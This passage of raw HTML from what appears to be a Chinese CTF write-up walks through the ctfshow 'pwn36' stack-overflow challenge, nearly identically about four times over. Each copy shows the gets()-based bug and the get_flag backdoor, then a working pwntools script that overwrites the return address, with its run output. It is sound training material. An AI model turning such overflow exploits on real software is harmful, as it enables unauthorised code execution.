title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-25"><a href="#pwn36-25" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-26"><a href="#pwn36-26" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-27"><a href="#pwn36-27" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-28"><a href="#pwn36-28" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span 